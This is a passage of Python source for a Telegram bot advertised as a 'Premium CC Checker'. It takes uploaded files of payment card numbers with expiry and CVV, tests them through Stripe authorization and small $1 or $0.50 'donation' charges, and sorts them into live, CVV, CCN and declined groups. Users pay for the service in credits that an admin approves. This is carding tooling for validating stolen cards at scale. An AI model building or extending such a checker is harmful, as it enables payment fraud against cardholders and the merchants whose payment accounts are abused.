            users_text += f"\n\n📄 *... and {len(all_users) - 50} more users*"
        
        summary_text = (
            f"📊 *𝗨𝗦𝗘𝗥𝗦 𝗟𝗜𝗦𝗧 ({len(all_users)} 𝘁𝗼𝘁𝗮𝗹)*\n\n"
            f"👥 *𝗔𝗰𝘁𝗶𝘃𝗲 𝗨𝘀𝗲𝗿𝘀:* `{active_users}`\n"
            f"💰 *𝗧𝗼𝘁𝗮𝗹 𝗖𝗿𝗲𝗱𝗶𝘁𝘀 𝗶𝗻 𝗦𝘆𝘀𝘁𝗲𝗺:* `{total_credits}`\n\n"
            f"{users_text}"
        )
        
        await update.message.reply_text(summary_text, parse_mode=ParseMode.MARKDOWN)
    
    async def mode_auth_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        self.user_modes[user_id] = "stripe_auth"
        await update.message.reply_text(
            "*✅ 𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵 𝗠𝗼𝗱𝗲 𝗦𝗲𝗹𝗲𝗰𝘁𝗲𝗱!*\n\n*📤 𝗡𝗼𝘄 𝘀𝗲𝗻𝗱 𝘆𝗼𝘂𝗿 𝗰𝗮𝗿𝗱 𝗳𝗶𝗹𝗲 (𝗧𝗫𝗧 𝗳𝗼𝗿𝗺𝗮𝘁):*",
            parse_mode=ParseMode.MARKDOWN
        )
    
    async def mode_1_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        self.user_modes[user_id] = "stripe_charge"
        await update.message.reply_text(
            "*✅ 𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗮𝗿𝗴𝗲 $𝟭 𝗠𝗼𝗱𝗲 𝗦𝗲𝗹𝗲𝗰𝘁𝗲𝗱!*\n\n*📤 𝗡𝗼𝘄 𝘀𝗲𝗻𝗱 𝘆𝗼𝘂𝗿 𝗰𝗮𝗿𝗱 𝗳𝗶𝗹𝗲 (𝗧𝗫𝗧 𝗳𝗼𝗿𝗺𝗮𝘁):*",
            parse_mode=ParseMode.MARKDOWN
        )
    
    async def mode_50_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        self.user_modes[user_id] = "stripe_charge50"
        await update.message.reply_text(
            "*✅ 𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗮𝗿𝗴𝗲 $𝟬.𝟱𝟬 𝗠𝗼𝗱𝗲 𝗦𝗲𝗹𝗲𝗰𝘁𝗲𝗱!*\n\n*📤 𝗡𝗼𝘄 𝘀𝗲𝗻𝗱 𝘆𝗼𝘂𝗿 𝗰𝗮𝗿𝗱 𝗳𝗶𝗹𝗲 (𝗧𝗫𝗧 𝗳𝗼𝗿𝗺𝗮𝘁):*",
            parse_mode=ParseMode.MARKDOWN
        )
    
    async def send_trx_id_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        
        if not context.args:
            await update.message.reply_text(
                "📤 *𝗨𝘀𝗮𝗴𝗲:* `/𝘁𝗿𝘅 <𝗧𝗿𝗮𝗻𝘀𝗮𝗰𝘁𝗶𝗼𝗻_𝗜𝗗>`\n\n"
                "𝗦𝗲𝗻𝗱 𝘆𝗼𝘂𝗿 𝘁𝗿𝗮𝗻𝘀𝗮𝗰𝘁𝗶𝗼𝗻 𝗜𝗗 𝘁𝗼 𝘁𝗵𝗲 𝗮𝗱𝗺𝗶𝗻 𝗳𝗼𝗿 𝗰𝗿𝗲𝗱𝗶𝘁 𝗮𝗽𝗽𝗿𝗼𝘃𝗮𝗹.\n\n"
                "𝗘𝘅𝗮𝗺𝗽𝗹𝗲: `/𝘁𝗿𝘅 𝗧𝗥𝗫𝟭𝟮𝟯𝟰𝟱𝟲𝟳𝟴𝟵`",
                parse_mode=ParseMode.MARKDOWN
            )
            return
        
        trx_id = " ".join(context.args)
        user_data = UserDatabase.get_user(user_id)
        
        if not user_data:
            await update.message.reply_text("❌ *𝗨𝘀𝗲𝗿 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱. 𝗣𝗹𝗲𝗮𝘀𝗲 𝘂𝘀𝗲 /𝘀𝘁𝗮𝗿𝘁 𝗳𝗶𝗿𝘀𝘁.*", parse_mode=ParseMode.MARKDOWN)
            return
        
        try:
            await context.bot.send_message(
                chat_id=self.admin_id,
                text=f"📤 *𝗡𝗘𝗪 𝗧𝗥𝗔𝗡𝗦𝗔𝗖𝗧𝗜𝗢𝗡 𝗜𝗗*\n\n"
                     f"👤 *𝗨𝘀𝗲𝗿:* @{update.effective_user.username or 'N/A'}\n"
                     f"🆔 *𝗨𝘀𝗲𝗿 𝗜𝗗:* `{user_id}`\n"
                     f"📝 *𝗧𝗿𝗮𝗻𝘀𝗮𝗰𝘁𝗶𝗼𝗻 𝗜𝗗:* `{trx_id}`\n\n"
                     f"𝗨𝘀𝗲 `/𝗰𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝘁𝗿𝘅 {trx_id} <𝗮𝗺𝗼𝘂𝗻𝘁>` 𝘁𝗼 𝗮𝗽𝗽𝗿𝗼𝘃𝗲.",
                parse_mode=ParseMode.MARKDOWN
            )
        except Exception as e:
            print(f"Error notifying admin: {e}")
        
        TransactionManager.create_transaction(user_id, 0, trx_id, "manual")
        
        await update.message.reply_text(
            "✅ *𝗧𝗿𝗮𝗻𝘀𝗮𝗰𝘁𝗶𝗼𝗻 𝗜𝗗 𝗿𝗲𝗰𝗲𝗶𝘃𝗲𝗱!*\n\n"
            "𝗬𝗼𝘂𝗿 𝘁𝗿𝗮𝗻𝘀𝗮𝗰𝘁𝗶𝗼𝗻 𝗜𝗗 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝘀𝗲𝗻𝘁 𝘁𝗼 𝘁𝗵𝗲 𝗮𝗱𝗺𝗶𝗻.\n"
            "𝗬𝗼𝘂𝗿 𝗰𝗿𝗲𝗱𝗶𝘁𝘀 𝘄𝗶𝗹𝗹 𝗯𝗲 𝗮𝗱𝗱𝗲𝗱 𝘀𝗼𝗼𝗻.\n\n"
            "📧 *𝗔𝗱𝗺𝗶𝗻:* @𝗠𝗱𝗦𝗮𝗺𝗶𝗿𝟮𝟬𝟬𝟬",
            parse_mode=ParseMode.MARKDOWN
        )
    
    async def complete_trx_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Complete a transaction (admin only) - FIXED VERSION"""
        user_id = update.effective_user.id
        
        if not UserDatabase.is_admin(user_id):
            await update.message.reply_text("❌ *𝗔𝗰𝗰𝗲𝘀𝘀 𝗱𝗲𝗻𝗶𝗲𝗱. 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆.*", parse_mode=ParseMode.MARKDOWN)
            return
        
        if len(context.args) < 2:
            await update.message.reply_text(
                "✅ *𝗨𝘀𝗮𝗴𝗲:* `/𝗰𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝘁𝗿𝘅 <𝗧𝗿𝗮𝗻𝘀𝗮𝗰𝘁𝗶𝗼𝗻_𝗜𝗗> <𝗮𝗺𝗼𝘂𝗻𝘁>`\n\n"
                "𝗘𝘅𝗮𝗺𝗽𝗹𝗲: `/𝗰𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝘁𝗿𝘅 𝗧𝗥𝗫𝟭𝟮𝟯𝟰𝟱𝟲𝟳𝟴𝟵 𝟭𝟬𝟬`",
                parse_mode=ParseMode.MARKDOWN
            )
            return
        
        trx_code = context.args[0]
        try:
            amount = int(context.args[1])
        except ValueError:
            await update.message.reply_text("❌ *𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗮𝗺𝗼𝘂𝗻𝘁.*", parse_mode=ParseMode.MARKDOWN)
            return
        
        # Find transaction by custom trx_id
        transaction = TransactionManager.find_transaction_by_trx_id(trx_code)
        
        if not transaction:
            await update.message.reply_text("❌ *𝗧𝗿𝗮𝗻𝘀𝗮𝗰𝘁𝗶𝗼𝗻 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱 𝗼𝗿 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗰𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱.*", parse_mode=ParseMode.MARKDOWN)
            return
        
        target_user_id = transaction["user_id"]
        
        # Add credits to user
        new_balance = UserDatabase.add_credits(target_user_id, amount)
        
        # Complete transaction with amount
        TransactionManager.complete_transaction(transaction["transaction_id"], trx_code, amount)
        
        # Notify user
        try:
            await context.bot.send_message(
                chat_id=target_user_id,
                text=f"🎉 *𝗣𝗔𝗬𝗠𝗘𝗡𝗧 𝗖𝗢𝗡𝗙𝗜𝗥𝗠𝗘𝗗!*\n\n"
                     f"💰 *𝗔𝗺𝗼𝘂𝗻𝘁 𝗔𝗱𝗱𝗲𝗱:* `{amount}` credits\n"
                     f"💳 *𝗡𝗲𝘄 𝗕𝗮𝗹𝗮𝗻𝗰𝗲:* `{new_balance}` credits\n"
                     f"📝 *𝗧𝗿𝗮𝗻𝘀𝗮𝗰𝘁𝗶𝗼𝗻 𝗜𝗗:* `{trx_code}`\n\n"
                     f"𝗧𝗵𝗮𝗻𝗸 𝘆𝗼𝘂 𝗳𝗼𝗿 𝘆𝗼𝘂𝗿 𝗽𝘂𝗿𝗰𝗵𝗮𝘀𝗲!",
                parse_mode=ParseMode.MARKDOWN
            )
        except:
            pass
        
        await update.message.reply_text(
            f"✅ *𝗧𝗿𝗮𝗻𝘀𝗮𝗰𝘁𝗶𝗼𝗻 𝗰𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱!*\n\n"
            f"👤 *𝗨𝘀𝗲𝗿:* `{target_user_id}`\n"
            f"💰 *𝗔𝗺𝗼𝘂𝗻𝘁:* `{amount}` credits\n"
            f"💳 *𝗡𝗲𝘄 𝗕𝗮𝗹𝗮𝗻𝗰𝗲:* `{new_balance}` credits\n"
            f"📝 *𝗧𝗿𝗮𝗻𝘀𝗮𝗰𝘁𝗶𝗼𝗻 𝗜𝗗:* `{trx_code}`",
            parse_mode=ParseMode.MARKDOWN
        )
    
    async def process_file(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        username = update.effective_user.username
        
        user_data = UserDatabase.get_user(user_id)
        if not user_data or not user_data.get("is_active", True):
            await update.message.reply_text(
                "❌ *𝗬𝗼𝘂𝗿 𝗮𝗰𝗰𝗲𝘀𝘀 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗱𝗶𝘀𝗮𝗯𝗹𝗲𝗱 𝗯𝘆 𝗮𝗱𝗺𝗶𝗻.*\n\n"
                "𝗣𝗹𝗲𝗮𝘀𝗲 𝗰𝗼𝗻𝘁𝗮𝗰𝘁 @𝗠𝗱𝗦𝗮𝗺𝗶𝗿𝟮𝟬𝟬𝟬 𝗳𝗼𝗿 𝗮𝘀𝘀𝗶𝘀𝘁𝗮𝗻𝗰𝗲.",
                parse_mode=ParseMode.MARKDOWN
            )
            return
        
        # FIXED: Check if mode is selected by checking user_modes dictionary
        if user_id not in self.user_modes:
            await update.message.reply_text(
                "❌ *𝗣𝗹𝗲𝗮𝘀𝗲 𝘀𝗲𝗹𝗲𝗰𝘁 𝗮 𝗺𝗼𝗱𝗲 𝗳𝗶𝗿𝘀𝘁!*\n\n"
                "𝗨𝘀𝗲 /𝘀𝘁𝗮𝗿𝘁 𝘁𝗼 𝘀𝗲𝗹𝗲𝗰𝘁 𝗮 𝗰𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝗺𝗼𝗱𝗲 𝗯𝗲𝗳𝗼𝗿𝗲 𝘀𝗲𝗻𝗱𝗶𝗻𝗴 𝗳𝗶𝗹𝗲𝘀.",
                parse_mode=ParseMode.MARKDOWN
            )
            return
        
        mode = self.user_modes[user_id]
        
        try:
            file = await update.message.document.get_file()
            file_bytes = await file.download_as_bytearray()
            file_text = file_bytes.decode('utf-8', errors='ignore')
            
            cards = []
            for line in file_text.split('\n'):
                line = line.strip()
                if line and '|' in line:
                    cards.append(line)
            
            if not cards:
                await update.message.reply_text(
                    "❌ *𝗡𝗼 𝘃𝗮𝗹𝗶𝗱 𝗰𝗮𝗿𝗱𝘀 𝗳𝗼𝘂𝗻𝗱 𝗶𝗻 𝘁𝗵𝗲 𝗳𝗶𝗹𝗲!*\n\n"
                    "𝗣𝗹𝗲𝗮𝘀𝗲 𝗺𝗮𝗸𝗲 𝘀𝘂𝗿𝗲 𝘁𝗵𝗲 𝗳𝗶𝗹𝗲 𝗰𝗼𝗻𝘁𝗮𝗶𝗻𝘀 𝗰𝗮𝗿𝗱𝘀 𝗶𝗻 𝘁𝗵𝗲 𝗰𝗼𝗿𝗿𝗲𝗰𝘁 𝗳𝗼𝗿𝗺𝗮𝘁:\n"
                    "`𝗰𝗰𝗻|𝗺𝗺|𝘆𝘆|𝗰𝘃𝘃`",
                    parse_mode=ParseMode.MARKDOWN
                )
                return
            
            user_credits = user_data.get("credits", 0)
            user_free_checks = user_data.get("free_checks_available", 0)
            
            is_admin = UserDatabase.is_admin(user_id)
            
            # FIXED: Check if user has enough resources for ALL cards
            # Each card check costs 1 free check or 1 credit
            total_checks_needed = len(cards)
            total_available = user_free_checks + user_credits
            
            if not is_admin and total_available < total_checks_needed:
                await update.message.reply_text(
                    "❌ *𝗜𝗻𝘀𝘂𝗳𝗳𝗶𝗰𝗶𝗲𝗻𝘁 𝗰𝗿𝗲𝗱𝗶𝘁𝘀!*\n\n"
                    f"𝗬𝗼𝘂 𝗻𝗲𝗲𝗱 `{total_checks_needed}` 𝗰𝗿𝗲𝗱𝗶𝘁𝘀/𝗳𝗿𝗲𝗲 𝗰𝗵𝗲𝗰𝗸𝘀 𝘁𝗼 𝗰𝗵𝗲𝗰𝗸 `{len(cards)}` 𝗰𝗮𝗿𝗱𝘀.\n"
                    f"𝗬𝗼𝘂 𝗵𝗮𝘃𝗲 `{user_credits}` 𝗰𝗿𝗲𝗱𝗶𝘁𝘀 𝗮𝗻𝗱 `{user_free_checks}` 𝗳𝗿𝗲𝗲 𝗰𝗵𝗲𝗰𝗸𝘀.\n\n"
                    "𝗨𝘀𝗲 /𝗯𝘂𝘆𝗰𝗿𝗲𝗱𝗶𝘁𝘀 𝘁𝗼 𝗽𝘂𝗿𝗰𝗵𝗮𝘀𝗲 𝗺𝗼𝗿𝗲 𝗰𝗿𝗲𝗱𝗶𝘁𝘀.",
                    parse_mode=ParseMode.MARKDOWN
                )
                return
            
            self.user_sessions[user_id] = {
                'cards': cards,
                'mode': mode,
                'stats': {
                    'TOTAL': len(cards),
                    'APPROVED': 0,
                    'CCN': 0,
                    'CVV': 0,
                    'INSUFFICIENT_FUNDS': 0,
                    'DECLINED': 0,
                    '3D_LIVE': 0,
                    'STRIPE_AUTH': 0,
                    'ERROR': 0,
                    'UNKNOWN': 0
                },
                'categorized_cards': {
                    'APPROVED': [],
                    'CCN': [],
                    'CVV': [],
                    'INSUFFICIENT_FUNDS': [],
                    'DECLINED': [],
                    '3D_LIVE': [],
                    'STRIPE_AUTH': [],
                    'ERROR': [],
                    'UNKNOWN': []
                },
                'all_results': [],
                'start_time': time.time(),
                'active': True,
                'user_credits': user_credits,
                'user_free_checks': user_free_checks,
                'credits_deducted_for_checks': 0,  # Track credits deducted for checking
                'credits_deducted_for_approved': 0  # Track credits deducted for approved cards
            }
            
            self.active_processes[user_id] = True
            
            asyncio.create_task(self.process_cards(user_id, update, context))
            
        except Exception as e:
            await update.message.reply_text(
                f"❌ *𝗘𝗿𝗿𝗼𝗿 𝗽𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴 𝗳𝗶𝗹𝗲:* `{str(e)[:100]}`",
                parse_mode=ParseMode.MARKDOWN
            )
    
    async def handle_text(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        text = update.message.text
        
        if '|' in text and len(text) > 10:
            await update.message.reply_text(
                "📝 *𝗜𝗻𝘀𝘁𝗿𝘂𝗰𝘁𝗶𝗼𝗻𝘀:*\n\n"
                "𝗣𝗹𝗲𝗮𝘀𝗲 𝘀𝗲𝗻𝗱 𝗮 𝗧𝗫𝗧 𝗳𝗶𝗹𝗲 𝘄𝗶𝘁𝗵 𝗺𝘂𝗹𝘁𝗶𝗽𝗹𝗲 𝗰𝗮𝗿𝗱𝘀, 𝗻𝗼𝘁 𝗷𝘂𝘀𝘁 𝗼𝗻𝗲 𝗰𝗮𝗿𝗱.\n\n"
                "📁 *𝗛𝗼𝘄 𝘁𝗼 𝗽𝗿𝗲𝗽𝗮𝗿𝗲 𝘆𝗼𝘂𝗿 𝗳𝗶𝗹𝗲:*\n"
                "𝟭. 𝗖𝗿𝗲𝗮𝘁𝗲 𝗮 𝗧𝗫𝗧 𝗳𝗶𝗹𝗲\n"
                "𝟮. 𝗔𝗱𝗱 𝗰𝗮𝗿𝗱𝘀 𝗶𝗻 𝘁𝗵𝗶𝘀 𝗳𝗼𝗿𝗺𝗮𝘁:\n"
                "   `𝗰𝗰𝗻|𝗺𝗺|𝘆𝘆|𝗰𝘃𝘃`\n"
                "𝟯. 𝗢𝗻𝗲 𝗰𝗮𝗿𝗱 𝗽𝗲𝗿 𝗹𝗶𝗻𝗲\n"
                "𝟰. 𝗦𝗲𝗻𝗱 𝘁𝗵𝗲 𝗧𝗫𝗧 𝗳𝗶𝗹𝗲 𝘁𝗼 𝘁𝗵𝗶𝘀 𝗯𝗼𝘁\n\n"
                "𝗨𝘀𝗲 /𝘀𝘁𝗮𝗿𝘁 𝘁𝗼 𝘀𝗲𝗹𝗲𝗰𝘁 𝗮 𝗺𝗼𝗱𝗲 𝗳𝗶𝗿𝘀𝘁.",
                parse_mode=ParseMode.MARKDOWN
            )
        else:
            await update.message.reply_text(
                "🤖 *𝗜 𝗰𝗮𝗻'𝘁 𝗽𝗿𝗼𝗰𝗲𝘀𝘀 𝘁𝗲𝘅𝘁 𝗺𝗲𝘀𝘀𝗮𝗴𝗲𝘀.*\n\n"
                "📁 *𝗪𝗵𝗮𝘁 𝗜 𝗰𝗮𝗻 𝗱𝗼:*\n"
                "• 𝗣𝗿𝗼𝗰𝗲𝘀𝘀 𝗧𝗫𝗧 𝗳𝗶𝗹𝗲𝘀 𝘄𝗶𝘁𝗵 𝗰𝗮𝗿𝗱𝘀\n"
                "• 𝗦𝗵𝗼𝘄 𝘆𝗼𝘂𝗿 𝗰𝗿𝗲𝗱𝗶𝘁𝘀 𝗮𝗻𝗱 𝘀𝘁𝗮𝘁𝘀\n"
                "• 𝗛𝗲𝗹𝗽 𝘆𝗼𝘂 𝗯𝘂𝘆 𝗺𝗼𝗿𝗲 𝗰𝗿𝗲𝗱𝗶𝘁𝘀\n\n"
                "📝 *𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀:*\n"
                "• /𝘀𝘁𝗮𝗿𝘁 - 𝗦𝘁𝗮𝗿𝘁 𝘁𝗵𝗲 𝗯𝗼𝘁\n"
                "• /𝗵𝗲𝗹𝗽 - 𝗦𝗵𝗼𝘄 𝗵𝗲𝗹𝗽\n"
                "• /𝗰𝗿𝗲𝗱𝗶𝘁𝘀 - 𝗖𝗵𝗲𝗰𝗸 𝘆𝗼𝘂𝗿 𝗰𝗿𝗲𝗱𝗶𝘁𝘀\n"
                "• /𝗯𝘂𝘆𝗰𝗿𝗲𝗱𝗶𝘁𝘀 - 𝗕𝘂𝘆 𝗺𝗼𝗿𝗲 𝗰𝗿𝗲𝗱𝗶𝘁𝘀",
                parse_mode=ParseMode.MARKDOWN
            )
    
    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        username = update.effective_user.username
        
        user_data = UserDatabase.create_user(user_id, username)
        
        if not user_data.get("is_active", True):
            await update.message.reply_text(
                "❌ *𝗬𝗼𝘂𝗿 𝗮𝗰𝗰𝗲𝘀𝘀 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗱𝗶𝘀𝗮𝗯𝗹𝗲𝗱 𝗯𝘆 𝗮𝗱𝗺𝗶𝗻.*\n\n"
                "𝗣𝗹𝗲𝗮𝘀𝗲 𝗰𝗼𝗻𝘁𝗮𝗰𝘁 @𝗠𝗱𝗦𝗮𝗺𝗶𝗿𝟮𝟬𝟬𝟬 𝗳𝗼𝗿 𝗮𝘀𝘀𝗶𝘀𝘁𝗮𝗻𝗰𝗲.",
                parse_mode=ParseMode.MARKDOWN
            )
            return
        
        is_admin = UserDatabase.is_admin(user_id)
        credits = "𝗨𝗻𝗹𝗶𝗺𝗶𝘁𝗲𝗱" if is_admin else user_data.get("credits", 0)
        free_checks = user_data.get("free_checks_available", 0)
        
        free_checks_msg = ""
        if free_checks > 0:
            free_checks_msg = f"\n🎁 *𝗙𝗥𝗘𝗘 𝗖𝗛𝗘𝗖𝗞𝗦:* `{free_checks}` (First user bonus!)\n"
        elif is_admin:
            free_checks_msg = "\n👑 *𝗔𝗗𝗠𝗜𝗡:* Unlimited Credits!\n"
        
        welcome_text = f"""
🤖 *𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗖𝗖 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 𝗕𝗢𝗧*
    
*𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝘁𝗵𝗲 𝗨𝗹𝘁𝗶𝗺𝗮𝘁𝗲 𝗖𝗖 𝗖𝗵𝗲𝗰𝗸𝗲𝗿 𝘄𝗶𝘁𝗵 𝗧𝗿𝗶𝗽𝗹𝗲 𝗠𝗼𝗱𝗮𝗹!*
    
💳 *𝗬𝗼𝘂𝗿 𝗖𝗿𝗲𝗱𝗶𝘁𝘀:* `{credits}`{free_checks_msg}
📊 *𝗖𝗮𝗿𝗱𝘀 𝗖𝗵𝗲𝗰𝗸𝗲𝗱:* `{user_data.get('total_cards_checked', 0)}`
✅ *𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗:* `{user_data.get('approved_cards', 0)}`
    
🔒 *𝗦𝗘𝗟𝗘𝗖𝗧 𝗠𝗢𝗗𝗘:*
𝟭️⃣ *𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵* - 𝗔𝗰𝗰𝗼𝘂𝗻𝘁 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗮𝘁𝗶𝗼𝗻 𝗰𝗵𝗲𝗰𝗸 (𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸𝗲𝗿)
𝟮️⃣ *𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗮𝗿𝗴𝗲 $𝟭* - $𝟭 𝗱𝗼𝗻𝗮𝘁𝗶𝗼𝗻 𝗰𝗵𝗮𝗿𝗴𝗲 𝘁𝗲𝘀𝘁
𝟯️⃣ *𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗮𝗿𝗴𝗲 $𝟬.𝟱𝟬* - $𝟬.𝟱𝟬 𝗱𝗼𝗻𝗮𝘁𝗶𝗼𝗻 𝗰𝗵𝗮𝗿𝗴𝗲 𝘁𝗲𝘀𝘁
    
📁 *𝗛𝗢𝗪 𝗧𝗢 𝗨𝗦𝗘:*
𝟭️⃣ 𝗦𝗲𝗹𝗲𝗰𝘁 𝘆𝗼𝘂𝗿 𝗰𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝗺𝗼𝗱𝗲
𝟮️⃣ 𝗣𝗿𝗲𝗽𝗮𝗿𝗲 𝗰𝗮𝗿𝗱 𝗳𝗶𝗹𝗲 𝗶𝗻 𝗧𝗫𝗧 𝗳𝗼𝗿𝗺𝗮𝘁
𝟯️⃣ 𝗙𝗼𝗿𝗺𝗮𝘁: `𝗰𝗰𝗻|𝗺𝗺|𝘆𝘆|𝗰𝘃𝘃`
𝟰️⃣ 𝗦𝗲𝗻𝗱 𝘁𝗵𝗲 𝗧𝗫𝗧 𝗳𝗶𝗹𝗲 𝘁𝗼 𝘁𝗵𝗶𝘀 𝗯𝗼𝘁
𝟱️⃣ 𝗪𝗮𝘁𝗰𝗵 𝗿𝗲𝗮𝗹-𝘁𝗶𝗺𝗲 𝗿𝗲𝘀𝘂𝗹𝘁𝘀
    
⚡ *𝗙𝗘𝗔𝗧𝗨𝗥𝗘𝗦:*
• ✅ 𝗧𝗿𝗶𝗽𝗹𝗲 𝗺𝗼𝗱𝗲 𝗰𝗵𝗲𝗰𝗸𝗶𝗻𝗴
• 📊 𝗥𝗲𝗮𝗹-𝘁𝗶𝗺𝗲 𝘀𝘁𝗮𝘁𝗶𝘀𝘁𝗶𝗰𝘀
• 🎯 𝗔𝗰𝗰𝘂𝗿𝗮𝘁𝗲 𝗖𝗩𝗩/𝗖𝗖𝗡 𝗱𝗲𝘁𝗲𝗰𝘁𝗶𝗼𝗻
• 🏦 𝗕𝗜𝗡 𝗟𝗼𝗼𝗸𝘂𝗽
• ⚡ 𝗛𝗶𝗴𝗵-𝘀𝗽𝗲𝗲𝗱 𝗽𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴
"""
        
        keyboard = [
            [InlineKeyboardButton("🔒 𝗦𝗧𝗥𝗜𝗣𝗘 𝗔𝗨𝗧𝗛 𝗠𝗢𝗗𝗘", callback_data="mode_auth")],
            [InlineKeyboardButton("💰 𝗦𝗧𝗥𝗜𝗣𝗘 𝗖𝗛𝗔𝗥𝗚𝗘 $𝟭 𝗠𝗢𝗗𝗘", callback_data="mode_charge")],
            [InlineKeyboardButton("💵 𝗦𝗧𝗥𝗜𝗣𝗘 𝗖𝗛𝗔𝗥𝗚𝗘 $𝟬.𝟱𝟬 𝗠𝗢𝗗𝗘", callback_data="mode_charge50")],
            [InlineKeyboardButton("💳 𝗖𝗛𝗘𝗖𝗞 𝗖𝗥𝗘𝗗𝗜𝗧𝗦", callback_data="check_credits"),
             InlineKeyboardButton("📊 𝗨𝗦𝗘𝗥 𝗦𝗧𝗔𝗧𝗦", callback_data="user_stats")],
            [InlineKeyboardButton("🛒 𝗕𝗨𝗬 𝗖𝗥𝗘𝗗𝗜𝗧𝗦", callback_data="buy_credits")] if not is_admin else [],
            [InlineKeyboardButton("🎁 𝗔𝗗𝗠𝗜𝗡 𝗣𝗔𝗡𝗘𝗟", callback_data="admin_panel")] if is_admin else [],
            [InlineKeyboardButton("📋 𝗠𝗘𝗡𝗨 𝗕𝗔𝗥", callback_data="menu_bar")],
            [InlineKeyboardButton("❓ 𝗛𝗘𝗟𝗣", callback_data="help")]
        ]
        
        keyboard = [row for row in keyboard if row]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            welcome_text,
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=reply_markup
        )
    
    async def credits_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        
        user_data = UserDatabase.get_user(user_id)
        if not user_data:
            await update.message.reply_text("❌ *𝗨𝘀𝗲𝗿 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱. 𝗣𝗹𝗲𝗮𝘀𝗲 𝘂𝘀𝗲 /𝘀𝘁𝗮𝗿𝘁 𝗳𝗶𝗿𝘀𝘁.*", parse_mode=ParseMode.MARKDOWN)
            return
        
        if not user_data.get("is_active", True):
            await update.message.reply_text("❌ *𝗬𝗼𝘂𝗿 𝗮𝗰𝗰𝗲𝘀𝘀 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗱𝗶𝘀𝗮𝗯𝗹𝗲𝗱 𝗯𝘆 𝗮𝗱𝗺𝗶𝗻.*", parse_mode=ParseMode.MARKDOWN)
            return
        
        is_admin = UserDatabase.is_admin(user_id)
        credits = "𝗨𝗻𝗹𝗶𝗺𝗶𝘁𝗲𝗱" if is_admin else user_data.get("credits", 0)
        total_checked = user_data.get("total_cards_checked", 0)
        approved = user_data.get("approved_cards", 0)
        free_checks = user_data.get("free_checks_available", 0)
        free_checks_used = user_data.get("free_checks_used", 0)
        
        free_checks_msg = ""
        if free_checks > 0:
            free_checks_msg = f"\n🎁 *𝗙𝗥𝗘𝗘 𝗖𝗛𝗘𝗖𝗞𝗦:* `{free_checks}` available\n"
        if free_checks_used > 0:
            free_checks_msg += f"📊 *𝗙𝗿𝗲𝗲 𝗰𝗵𝗲𝗰𝗸𝘀 𝘂𝘀𝗲𝗱:* `{free_checks_used}`\n"
        
        admin_msg = "\n👑 *𝗔𝗗𝗠𝗜𝗡:* Unlimited Credits!\n" if is_admin else ""
        
        credits_text = f"""
💳 *𝗖𝗥𝗘𝗗𝗜𝗧𝗦 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡*
        
👤 *𝗨𝘀𝗲𝗿:* @{update.effective_user.username or '𝗡/𝗔'}
🆔 *𝗜𝗗:* `{user_id}`
        
💰 *𝗔𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲 𝗖𝗿𝗲𝗱𝗶𝘁𝘀:* `{credits}`{admin_msg}{free_checks_msg}
📊 *𝗧𝗼𝘁𝗮𝗹 𝗖𝗮𝗿𝗱𝘀 𝗖𝗵𝗲𝗰𝗸𝗲𝗱:* `{total_checked}`
✅ *𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 𝗖𝗮𝗿𝗱𝘀:* `{approved}`
❌ *𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 𝗖𝗮𝗿𝗱𝘀:* `{user_data.get('declined_cards', 0)}`
✅ *𝗖𝗩𝗩 𝗖𝗮𝗿𝗱𝘀:* `{user_data.get('cvv_cards', 0)}`
✅ *𝗖𝗖𝗡 𝗖𝗮𝗿𝗱𝘀:* `{user_data.get('ccn_cards', 0)}`
        
